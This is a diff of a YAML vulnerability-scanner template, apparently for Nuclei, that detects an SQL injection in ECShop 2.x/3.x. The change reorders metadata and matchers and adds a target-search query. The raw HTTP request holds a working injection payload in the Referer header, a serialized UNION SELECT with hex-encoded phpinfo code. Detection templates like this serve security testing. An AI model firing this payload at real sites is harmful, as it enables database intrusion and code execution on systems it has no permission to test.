@@ -1,5 +1,4 @@
 id: ecshop-sqli
-
 info:
   name: ECShop 2.x/3.x - SQL Injection
   author: Lark-lab,ImNightmaree,ritikchaddha
@@ -17,13 +16,21 @@ info:
     cwe-id: CWE-89
     cpe: cpe:2.3:a:shopex:ecshop:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    fofa-query: app="ECShop"
     max-request: 2
+    product: ecshop
     vendor: shopex
-  tags: sqli,php,ecshop,vuln
-
+    verified: true
+  tags: ecshop,php,sqli,vuln
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        type: word
+        words:
+          - '[error] =>'
+          - '[0] => Array'
+          - MySQL server error report:Array
+    raw:
       - |
         GET /user.php?act=login HTTP/1.1
         Host: {{Hostname}}
@@ -34,13 +41,4 @@ http:
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
         Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca
-
     stop-at-first-match: true
-    matchers:
-      - type: word
-        words:
-          - '[error] =>'
-          - '[0] => Array'
-          - 'MySQL server error report:Array'
-        condition: and
-
